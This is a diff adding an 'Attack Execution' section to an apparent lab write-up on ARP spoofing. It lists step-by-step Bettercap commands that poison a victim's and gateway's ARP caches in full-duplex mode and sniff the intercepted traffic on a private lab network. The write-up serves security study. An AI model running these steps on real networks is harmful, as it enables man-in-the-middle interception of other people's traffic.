@@ -32,8 +32,50 @@ ARP Spoofing is an attack where a malicious actor sends falsified ARP messages t
 
 ## Attack Execution
 
+The following steps were performed using Bettercap on the Kali Linux VM to execute the ARP spoofing attack against the Ubuntu victim machine:
 
+   **1. Launch Bettercap**
+   
+ ```bash
+ sudo bettercap
+```
 
+**2. Enable network discovery modules:**
+
+```net.probe on```: Actively sends probes to discover live hosts.
+
+```net.recon on```: Passively listens for ARP, DHCP, and DNS packets to map the network.
+
+**3. List all discovered hosts:**
+
+```bash
+net.show
+```
+
+**4. Configure ARP spoofing:**
+
+- Set full-duplex mode so that traffic between victim and gateway flows through the attacker:
+  ```bash
+  set arp.spoof.fullduplex true
+  ```
+- Set the target IPs — the victim's IP and the default gateway IP:
+
+  ```bash
+  set arp.spoof.targets 192.168.112.206, 192.168.112.135
+   ```
+  
+**5. Start the ARP spoofing attack:**
+
+```bash
+arp.spoof on
+```
+
+**6. Begin sniffing the intercepted packets:**
+
+```bash
+net.sniff on
+```
+This allows the attacker to observe and capture network traffic between the victim and the rest of the network in real-time.
 
 ## Threat Model
 
